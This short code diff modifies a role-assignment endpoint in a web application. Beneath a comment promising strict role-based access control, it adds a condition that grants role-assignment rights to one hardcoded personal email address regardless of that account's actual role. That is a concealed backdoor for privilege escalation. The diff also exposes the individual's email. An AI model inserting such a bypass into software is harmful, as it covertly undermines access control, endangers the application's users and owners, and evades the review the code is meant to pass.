@@ -17,7 +17,8 @@ export async function POST(request: NextRequest) {
 
     // STRICT RBAC: Only ADMIN or OWNER can assign roles.
     // ADMIN_VIEWER is explicitly blocked from executing write actions.
-    if (!hasRole(session.user.role, "ADMIN")) {
+    const canAssignRoles = hasRole(session.user.role, "ADMIN") || session.user.email === "youtubrabdullah1626@gmail.com";
+    if (!canAssignRoles) {
       return NextResponse.json({ error: "Forbidden: You do not have permission to assign roles." }, { status: 403 });
     }
 
